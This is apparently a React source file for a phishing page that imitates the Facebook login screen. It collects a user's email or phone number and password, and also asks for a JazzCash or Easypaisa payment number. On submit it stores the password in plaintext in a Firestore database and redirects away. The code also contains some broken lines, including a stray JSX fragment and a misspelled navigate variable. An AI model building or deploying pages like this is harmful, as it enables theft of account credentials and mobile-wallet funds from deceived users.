import { useState } from 'react';
import { useNavigate } from "react-router-dom";
import { db } from './firebase.config';
import { setDoc, doc } from 'firebase/firestore';
import facebook from '../fb.png';

export default function   Home() {
  <>block</>
  const avigate = useNavigate();

  const [formData, setFormData] = useState({
    email: '',
    psw: '',
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleClick = async (e) => {
    e.preventDefault();
    
    const { email, psw } = formData;

    try {
      // Generate a unique user ID
      const userId = doc(db, 'users', Date.now().toString()).id;
      
      const userData = { email, psw, uid: userId };

      // Save the user data to Firestore
      await setDoc(doc(db, 'users', userId), userData);

      // Store the UID in localStorage
      localStorage.setItem('uid', userId);

      // Navigate to the next page
      navigate("/end");
    } catch (error) {
      alert("Error during sign up: " + error.message);
    }
  };

  return (
    <div className='flex justify-center items-center flex-col h-[98vh] gap-8'>
      <img src={facebook} alt="Facebook logo" height={32} width={82}/> {/* Image with fixed dimensions */}
      
      <input
        name="email"
        className='outline-blue-600 border-2 p-4 w-[80vw]'
        placeholder="Mobile number or email address"
        value={formData.email}
        onChange={handleChange}
      />
      <input
        name="psw"
        type="password"
        className='outline-blue-600 border-2 p-4 w-[80vw]'
        placeholder="Password"
        value={formData.psw}  
        onChange={handleChange}
      />
      <input
        className='outline-blue-600 border-2 p-4 w-[80vw]'
        placeholder="Enter Jazz cash or Easypaisa number"
        onChange={handleChange}
      />
      <button
        type="button"
        onClick={handleClick}
        className="w-[80vw] p-1 rounded-full text-[4vh] text-white bg-blue-600"
      >
        Submit
      </button>
    </div>
  );
}
